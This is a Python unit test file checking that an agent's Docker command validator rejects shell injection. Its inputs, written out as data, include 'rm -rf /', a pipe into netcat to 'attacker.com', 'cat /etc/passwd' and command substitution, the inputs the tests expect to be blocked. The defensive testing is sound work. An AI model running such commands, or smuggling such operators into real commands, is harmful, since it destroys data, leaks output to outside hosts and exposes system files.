# tests/unit/test_docker_validation.py
import pytest
import asyncio
from agent.tools import safe_docker_exec
from agent.schemas import DockerCommand


def test_block_shell_injection_semicolon():
    """Test that shell injection with semicolon is blocked"""
    # Pydantic validation blocks this first, which is good
    with pytest.raises(Exception):  # pydantic.ValidationError or ValueError
        bad = DockerCommand(command="ps ; rm -rf /", container="test", timeout=5)


def test_block_pipe():
    """Test that pipe operator is blocked"""
    with pytest.raises(Exception):
        bad = DockerCommand(command="ps | nc attacker.com 4444", container="test", timeout=5)


def test_block_double_ampersand():
    """Test that && operator is blocked"""
    with pytest.raises(Exception):
        bad = DockerCommand(command="ps && rm -rf /", container="test", timeout=5)


def test_block_double_pipe():
    """Test that || operator is blocked"""
    with pytest.raises(Exception):
        bad = DockerCommand(command="ps || cat /etc/passwd", container="test", timeout=5)


def test_block_backticks():
    """Test that backtick command substitution is blocked"""
    with pytest.raises(Exception):
        bad = DockerCommand(command="ps `whoami`", container="test", timeout=5)


def test_block_dollar_parentheses():
    """Test that $() command substitution is blocked"""
    with pytest.raises(Exception):
        bad = DockerCommand(command="ps $(whoami)", container="test", timeout=5)


def test_valid_command_passes():
    """Test that valid commands pass validation"""
    good = DockerCommand(command="logs mycontainer", container="test", timeout=5)
    result = asyncio.run(safe_docker_exec(good))
    # Should not raise ValueError, but may return error from docker-executor
    assert result is not None
